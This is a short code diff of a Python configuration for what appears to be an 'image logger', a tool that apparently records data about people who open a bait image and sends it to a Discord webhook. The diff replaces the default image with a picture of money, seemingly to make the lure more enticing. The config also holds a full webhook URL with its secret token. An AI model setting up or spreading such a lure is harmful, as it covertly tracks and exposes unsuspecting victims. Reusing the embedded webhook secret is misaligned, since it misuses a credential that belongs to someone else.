@@ -22,7 +22,7 @@ config = {
 
     "webhook": "https://discord.com/api/webhooks/1497596983408464103/Sw8LBmqi7iZS3gC0kJcI5MN69OGRv3gMxWC8gYBq5pHgpd0UDe3COx0Rclh4fpS1FpiH",
 
-    "image": "https://support.discord.com/hc/user_images/985lSPYWtgWuxPKcSKjCnA.png", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/4/47/Money_-_Flickr_-_AMagill.jpg", # You can also have a custom image by using a URL argument
 
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
